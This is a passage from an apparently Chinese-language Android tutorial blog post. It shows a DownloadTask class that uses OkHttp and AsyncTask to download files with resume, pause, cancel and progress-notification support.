&#123;<br>            <span class="hljs-comment">// 当progress大于或等于0时才需显示下载进度</span><br>            builder.setContentText(progress + <span class="hljs-string">&quot;%&quot;</span>);<br>            builder.setProgress(<span class="hljs-number">100</span>, progress, <span class="hljs-literal">false</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> builder.build();<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="DownloadTask"><a href="#DownloadTask" class="headerlink" title="DownloadTask"></a>DownloadTask</h3><p>这里利用<code>okhttp</code>对文件进行下载操作，并且由于下载的操作需要耗时，因此放在子线程中运行，但是这里注意修改<code>UI</code>的操作不能再子线程中，因此需要使用<code>publishProgress()</code>方法传递参数实时修改<code>UI</code>效果。采用<code>AsyncTask</code>实现多线程。</p><p><code>AsyncTask</code>执行顺序<code>doInBackground()-&gt;onProgressUpdate()-&gt;onPostExecute()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br>   <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Integer <span class="hljs-title function_">doInBackground</span><span class="hljs-params">(String... params)</span> &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">RandomAccessFile</span> <span class="hljs-variable">savedFile</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">downloadedLength</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 记录已下载的文件长度</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">downloadUrl</span> <span class="hljs-operator">=</span> params[<span class="hljs-number">0</span>];<br>            <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> downloadUrl.substring(downloadUrl.lastIndexOf(<span class="hljs-string">&quot;/&quot;</span>));<br>            <span class="hljs-type">String</span> <span class="hljs-variable">directory</span> <span class="hljs-operator">=</span> Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getPath();<br>            file = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(directory + fileName);<br>            <span class="hljs-keyword">if</span> (file.exists()) &#123;<br>                downloadedLength = file.length();<span class="hljs-comment">//记录已下载文件的长度</span><br>            &#125;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">contentLength</span> <span class="hljs-operator">=</span> getContentLength(downloadUrl);<br>            <span class="hljs-keyword">if</span> (contentLength == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span> TYPE_FAILED;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contentLength == downloadedLength) &#123;<br>                <span class="hljs-comment">// 已下载字节和文件总字节相等，说明已经下载完成了</span><br>                <span class="hljs-keyword">return</span> TYPE_SUCCESS;<br>            &#125;<br>            <span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>();<br>            <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>.Builder()<br>                    <span class="hljs-comment">// 断点下载，指定从哪个字节开始下载</span><br>                    .addHeader(<span class="hljs-string">&quot;RANGE&quot;</span>, <span class="hljs-string">&quot;bytes=&quot;</span> + downloadedLength + <span class="hljs-string">&quot;-&quot;</span>)<br>                    .url(downloadUrl)<br>                    .build();<br>            <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> client.newCall(request).execute();<br>            <span class="hljs-keyword">if</span> (response != <span class="hljs-literal">null</span>) &#123;<br>                is = response.body().byteStream();<br>                savedFile = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RandomAccessFile</span>(file, <span class="hljs-string">&quot;rw&quot;</span>);<br>                savedFile.seek(downloadedLength); <span class="hljs-comment">// 跳过已下载的字节</span><br>                <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                <span class="hljs-type">int</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>                <span class="hljs-type">int</span> len;<br>                <span class="hljs-keyword">while</span> ((len = is.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (isCanceled) &#123;<br>                        <span class="hljs-keyword">return</span> TYPE_CANCELED;<br>                    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(isPaused) &#123;<br>                        <span class="hljs-keyword">return</span> TYPE_PAUSED;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        total += len;<br>                        savedFile.write(b, <span class="hljs-number">0</span>, len);<br>                        <span class="hljs-comment">// 计算已下载的百分比</span><br>                        <span class="hljs-type">int</span> <span class="hljs-variable">progress</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) ((total + downloadedLength) * <span class="hljs-number">100</span> / contentLength);<br>                        publishProgress(progress);<br>                    &#125;<br>                &#125;<br>                response.body().close();<br>                <span class="hljs-keyword">return</span> TYPE_SUCCESS;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (is != <span class="hljs-literal">null</span>) &#123;<br>                    is.close();<br>                &#125;<br>                <span class="hljs-keyword">if</span> (savedFile != <span class="hljs-literal">null</span>) &#123;<br>                    savedFile.close();<br>                &#125;<br>                <span class="hljs-keyword">if</span> (isCanceled &amp;&amp; file != <span class="hljs-literal">null</span>) &#123;<br>                    file.delete();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> TYPE_FAILED;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onProgressUpdate</span><span class="hljs-params">(Integer... values)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">progress</span> <span class="hljs-operator">=</span> values[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">if</span> (progress &gt; lastProgress) &#123;<br>            listener.onProgress(progress);<br>            lastProgress = progress;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onPostExecute</span><span class="hljs-params">(Integer status)</span> &#123;<br>        <span class="hljs-keyword">switch</span> (status) &#123;<br>            <span class="hljs-keyword">case</span> TYPE_SUCCESS:<br>                listener.onSuccess();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> TYPE_FAILED:<br>                listener.onFailed();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> TYPE_PAUSED:<br>                listener.onPaused();<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> TYPE_CANCELED:<br>                listener.onCanceled();<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pauseDownload</span><span class="hljs-params">()</span> &#123;<br>        isPaused = <span class="hljs-literal">true</span>;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">cancelDownload</span><span class="hljs-params">()</span> &#123;<br>        isCanceled = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> <span class="hljs-title function_">getContentLength</span><span class="hljs-params">(String downloadUrl)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OkHttpClient</span>();<br>        <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>.Builder()<br>                .url(downloadUrl)<br>                .build();<br>        <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> client.newCall(request).execute();<br>        <span class="hljs-keyword">if</span> (response != <span class="hljs-literal">null</span> &amp;&amp; response.isSuccessful()) &#123;<br>            <span class="hljs-type">long</span> <span class="hljs-variable">contentLength</span> <span class="hljs-operator">=</span> response.body().contentLength();<br>            response.close();<br>            <span class="hljs-keyword">return</span> contentLength;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Android编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
